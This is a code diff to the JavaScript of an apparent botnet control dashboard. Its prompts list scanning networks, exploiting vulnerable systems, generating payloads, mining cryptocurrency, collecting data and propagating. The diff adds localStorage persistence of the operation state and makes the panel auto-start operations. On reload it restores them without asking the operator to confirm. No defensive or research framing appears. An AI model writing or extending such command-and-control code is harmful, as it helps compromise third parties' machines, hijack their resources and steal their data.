@@ -518,21 +518,54 @@ let miningActive = false;
 let dominationActive = false;
 let lastHashrate = 0;
 let totalDataCollected = 0;
+let operationsStarted = false;
+
+// Restore state from localStorage
+function restoreState() {
+  const saved = localStorage.getItem('domination_state');
+  if (saved) {
+    const state = JSON.parse(saved);
+    miningActive = state.miningActive || false;
+    dominationActive = state.dominationActive || false;
+    operationsStarted = state.operationsStarted || false;
+    lastHashrate = state.lastHashrate || 0;
+    totalDataCollected = state.totalDataCollected || 0;
+    console.log('[DOM] State restored:', state);
+  }
+}
+
+// Save state to localStorage
+function saveState() {
+  const state = {
+    miningActive,
+    dominationActive,
+    operationsStarted,
+    lastHashrate,
+    totalDataCollected,
+    timestamp: Date.now()
+  };
+  localStorage.setItem('domination_state', JSON.stringify(state));
+}
 
 // Initialize
 document.addEventListener('DOMContentLoaded', () => {
   log('info', 'Dashboard initializing...', 'sys');
+  restoreState();
   initDomSocket();
   loadAll();
   setInterval(loadAll, 30000);
   setInterval(updateMiningStatus, 10000);
+  setInterval(saveState, 5000); // Save state every 5 sec
   
-  // Auto-start after 3 seconds if agents exist
+  // Auto-start after 3 seconds if agents exist and not already started
   setTimeout(async () => {
     const total = parseInt(document.getElementById('stat-total')?.textContent || '0');
-    if (total > 0) {
+    if (total > 0 && !operationsStarted) {
       log('info', 'Auto-starting operations...', 'sys');
       await startAll();
+    } else if (operationsStarted) {
+      log('info', 'Operations already running, restoring...', 'sys');
+      setButtonStatus('start', 'RUNNING');
     }
   }, 3000);
 });
@@ -815,7 +848,10 @@ async function startAll() {
     return;
   }
   
-  if (!confirm(`🚀 START ALL OPERATIONS?\n\nAgents: ${totalAgents} total, ${onlineAgents} online\n\nThis will:\n• Scan network for targets\n• Exploit vulnerable systems\n• Generate payloads\n• Start mining\n• Collect data\n• Begin propagation`)) return;
+  // Skip confirm if already started (restoring state)
+  if (!operationsStarted) {
+    if (!confirm(`🚀 START ALL OPERATIONS?\n\nAgents: ${totalAgents} total, ${onlineAgents} online\n\nThis will:\n• Scan network for targets\n• Exploit vulnerable systems\n• Generate payloads\n• Start mining\n• Collect data\n• Begin propagation`)) return;
+  }
   
   const btn = document.getElementById('btn-start-all');
   const status = document.getElementById('start-status');
@@ -920,6 +956,9 @@ async function startAll() {
     
     status.textContent = 'ACTIVE';
     btn.style.opacity = '1';
+    operationsStarted = true;
+    dominationActive = true;
+    saveState();
     
     log('success', '═══════════════════════════════════════════', 'sys');
     log('success', '✅ ALL OPERATIONS STARTED', 'sys');
@@ -1175,6 +1214,11 @@ async function seedDemoData() {
 
 async function stopAll() {
   if (!confirm('⏹️ STOP ALL OPERATIONS?\n\nThis will halt:\n• Mining\n• Propagation\n• Data collection')) return;
+  
+  operationsStarted = false;
+  dominationActive = false;
+  miningActive = false;
+  saveState();
   
   log('warn', '═══════════════════════════════════════════', 'sys');
   log('warn', 'STOPPING ALL OPERATIONS', 'sys');
